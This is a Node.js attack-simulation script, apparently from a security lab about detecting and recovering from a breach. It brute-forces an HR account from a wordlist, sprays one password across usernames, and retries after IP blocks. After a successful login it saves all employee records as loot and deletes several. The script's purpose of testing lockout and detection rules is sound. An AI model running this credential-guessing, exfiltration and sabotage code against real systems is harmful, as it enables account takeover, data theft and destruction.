'use strict';
// Brute-force attack simulator (the breach scenario).
// Attacker at 203.0.113.66 runs a small dictionary against hr.manager. The legacy password
// "Summer@2026" is 8th in the list. After getting in, the attacker downloads the employee records
// (exfiltration) and deletes some of them (sabotage) - the damage we then recover from backup.
//   node scripts/bruteforce.js [--user hr.manager] [--ip 203.0.113.66] [--delay 300] [--damage 8] [--no-wait]
//   node scripts/bruteforce.js --spray      (one password against many usernames -> rule R2)
const fs = require('fs');
const path = require('path');
const { client, sleep, now } = require('./lib_http');

const args = process.argv.slice(2);
const val = (k, d) => (args.includes(k) ? args[args.indexOf(k) + 1] : d);
const USER = val('--user', 'hr.manager');
const IP = val('--ip', '203.0.113.66');
const DELAY = Number(val('--delay', 300));
const DAMAGE = Number(val('--damage', 8));
const WAIT_ON_BLOCK = !args.includes('--no-wait');

const WORDLIST = ['123456', 'password', 'Password1', 'Welcome1!', 'Admin@123', 'NileTech2026', 'Qwerty@123',
  'Summer@2026', 'Winter@2026', 'Cairo@2026'];
const red = s => `\x1b[31m${s}\x1b[0m`, green = s => `\x1b[32m${s}\x1b[0m`, yellow = s => `\x1b[33m${s}\x1b[0m`;

async function spray() {
  const c = client(IP);
  for (const u of ['a.hassan', 'm.farouk', 's.nabil', 'n.adel', 'k.samir']) {
    const r = await c.login(u, 'Welcome@2026');
    console.log(`[${now()}] ${IP} spray ${u.padEnd(10)} -> ${r.data && r.data.status}`);
    await sleep(DELAY);
  }
}

async function attack() {
  const c = client(IP);
  console.log(red(`[${now()}] ATTACK: dictionary of ${WORDLIST.length} passwords against "${USER}" from ${IP}`));
  for (let i = 0; i < WORDLIST.length; i++) {
    const pw = WORDLIST[i];
    const r = await c.login(USER, pw);
    const st = r.data && r.data.status;
    console.log(`[${now()}] try ${String(i + 1).padStart(2)} ${pw.padEnd(13)} -> ${st}${r.data && r.data.blocked ? yellow('  (IP now BLOCKED)') : ''}`);

    if (st === 'blocked') {
      if (!WAIT_ON_BLOCK) { console.log(green('Attack stopped: IP blocked by R1.')); return; }
      console.log(yellow(`           blocked - waiting ${r.data.retry_after_s}s for the block to expire...`));
      await sleep(r.data.retry_after_s * 1000 + 200);
      i--; continue;                                   // retry the same password
    }
    if (st === 'locked') { console.log(green(`[${now()}] Account LOCKED by R3 - attacker kept out even with the right password.`)); return; }
    if (st === 'success') { console.log(red(`[${now()}] PASSWORD FOUND: "${pw}" - attacker is logged in as ${USER}`)); return postExploit(c); }
    await sleep(DELAY);
  }
  console.log('Wordlist exhausted.');
}

async function postExploit(c) {
  const rec = await c.get('/api/records');
  if (!Array.isArray(rec.data)) { console.log(green(`Records access refused: ${JSON.stringify(rec.data)}`)); return; }
  const loot = path.join(__dirname, '..', 'logs', 'attacker_loot.json');
  fs.writeFileSync(loot, JSON.stringify(rec.data, null, 2));
  console.log(red(`[${now()}] EXFILTRATED ${rec.data.length} employee records -> logs/attacker_loot.json`));
  let deleted = 0;
  for (const row of rec.data.slice(0, DAMAGE)) {
    const d = await c.del(`/api/records/${row.id}`);
    if (d.data && d.data.deleted) deleted++;
    await sleep(100);
  }
  console.log(red(`[${now()}] SABOTAGE: deleted ${deleted} records. Breach complete - now detect & recover.`));
}

(args.includes('--spray') ? spray() : attack()).catch(e => { console.error('Is the server running? ', e.message); process.exit(1); });
